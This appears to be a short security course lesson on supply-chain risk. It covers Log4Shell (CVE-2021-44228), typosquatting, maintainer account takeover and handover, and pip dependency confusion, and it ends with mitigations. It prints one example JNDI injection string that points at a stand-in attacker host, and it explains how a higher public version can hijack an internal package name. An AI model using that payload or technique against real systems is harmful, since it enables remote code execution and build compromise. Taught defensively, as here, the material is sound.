---
id: secp-dependency-selection-attacks
title: Log4Shell and package selection
level: intermediate
minutes: 3
sourceLesson: secp-supply-chain
summary: Separate a vulnerable dependency from a malicious package and understand index confusion.
---

Supply-chain risk includes both deliberate upstream tampering and ordinary bugs in trusted dependencies. Log4Shell illustrates the inventory problem; package-ecosystem attacks illustrate how names, credentials and version selection can direct a build to attacker-controlled code.

## Log4Shell: the vulnerable dependency (2021)

Not every supply-chain incident involves an attacker in the chain. **Log4Shell** (CVE-2021-44228, December 2021, CVSS 10.0) was a vulnerability in Log4j Core, a widely used Java logging component; it was not itself evidence of a malicious upstream implant.

Log4j supported *lookups*: `${...}` expressions inside log messages that were expanded at log time. One lookup was JNDI, which can fetch and load a Java object from a remote LDAP server. In vulnerable lookup paths and runtime configurations, attacker-controlled logged input could trigger a remote lookup, for example:

```
${jndi:ldap://evil.example/a}
```

The vulnerable path could contact an attacker LDAP endpoint and enable code execution, depending on runtime and reachable exploitation paths. The original advisory affected Log4j Core 2.0-beta9 through 2.14.1; `log4j-api` alone and Log4j 1.x are different cases.

A major defensive challenge was the question **"where do we run Log4j?"** It could be a **transitive dependency**, pulled in by a framework, inside a fat JAR, inside a vendor appliance. Fixes also came in waves: 2.15.0, then 2.16.0 and 2.17.0 for follow-up CVEs, then 2.17.1, so teams had to find everything more than once.

## Attacks on the package ecosystem

Beyond the three incidents introduced so far, recognise these patterns:

- **Typosquatting**: publishing `reqeusts` or `python-dateutils` and waiting for typos. Removal counts vary; the risk is selecting an attacker-controlled lookalike name.
- **Account takeover**: stealing a maintainer's registry credentials and publishing a malicious version of a real package (the npm package `ua-parser-js` in 2021 shipped a cryptominer this way).
- **Handover**: offering to maintain an abandoned package. In 2018 the npm `event-stream` package was handed to a new maintainer who added a dependency that targeted one Bitcoin wallet app.
- **Dependency confusion**: in his February 2021 account, Alex Birsan reported successful tests at more than 35 organisations, including Apple, Microsoft and PayPal. His research used exposed internal package names and public packages with matching names; a higher public version was one demonstrated selection route, especially with pip. Some installations occurred on developer machines as well as build servers.

> [!warning] Why dependency confusion works with pip
> With `pip install --extra-index-url https://pypi.internal ...`, pip gives indexes no priority and selects the best compatible candidate under its version constraints and resolver rules. If `acme-auth` is 1.4 internally and an attacker publishes `acme-auth` 99.0 on PyPI, pip can choose 99.0 when both candidates are compatible and no other constraints or installed-state decisions change selection. Use a single `--index-url` pointing at a proxy that serves your internal names exclusively, and pin hashes.

## Key takeaways
- Log4Shell was a vulnerability in affected Log4j Core configurations, rather than proof of a malicious implant.
- Typosquatting, account takeover and maintainer handover attack different parts of package trust.
- pip does not prioritise the internal index merely because it was configured alongside a public one.
- Use namespace and index policies that keep internal names under your control.

## Further reading
- [Apache Log4j advisories](https://logging.apache.org/log4j/2.x/security.html)
- [pip package selection and index warning](https://pip.pypa.io/en/stable/cli/pip_install/)
- [event-stream incident analysis by npm](https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident)
- [ua-parser-js maintainer incident report](https://github.com/faisalman/ua-parser-js/issues/536)
- [Birsan’s original dependency-confusion account](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)
